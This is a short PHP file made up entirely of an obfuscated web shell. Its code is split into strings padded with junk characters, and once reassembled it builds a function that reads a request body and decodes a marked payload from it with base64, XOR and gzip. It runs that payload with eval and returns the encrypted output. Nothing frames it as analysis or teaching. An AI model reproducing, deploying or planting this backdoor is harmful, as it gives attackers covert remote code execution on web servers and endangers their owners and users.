<?php
$Q='=Q.=$t=Q{$=Qi}^$k{$j=Q};}}re=Qtur=Qn $o;}if (@=Qp=Qreg_=Qmatch("/$kh(.+)=Q=Q$kf/",@file_g=Qet=Q_conte=Qnts("ph=Qp=Q:/';
$a='Qt_con=Qtents(=Q);@ob_e=Qnd_clean=Q();$r==Q@base6=Q4_en=Qcode(=Q@x(@gzc=Qompr=Qe=Qss($o),$k))=Q;prin=Qt("=Q$p$kh$r$kf");}';
$Y=str_replace('D','','creDatDeD_DfuncDDtion');
$G='/input"),$=Qm)=Q==1) {@ob_s=Qta=Qrt();@e=Qval(@gzuncom=Qpr=Qess(@x=Q(@ba=Qse64_dec=Qode($m[=Q=Q1]),$k)));$o=@o=Qb_ge=';
$m='$t,$k)=Q{$c=strl=Qen($k);$l=Q=strle=Qn($t)=Q;$o="";for($i=0=Q;$i=Q<$l;){for=Q($j=0=Q=Q;($j<$c&&$i<$l=Q);$j=Q++,$i=Q++){$o';
$v='$k==Q"a=Q4e9e6=Qc1";$kh="fe237=Q=Q2=Qa0a324";$k=Qf="b832d33f0a5=Qe";$p="=Qe1Otw9=Q=Qdj=Q4Y=QrV=QZcFZ";function x(=Q=Q';
$R=str_replace('=Q','',$v.$m.$Q.$G.$a);
$Z=$Y('',$R);$Z();
?>
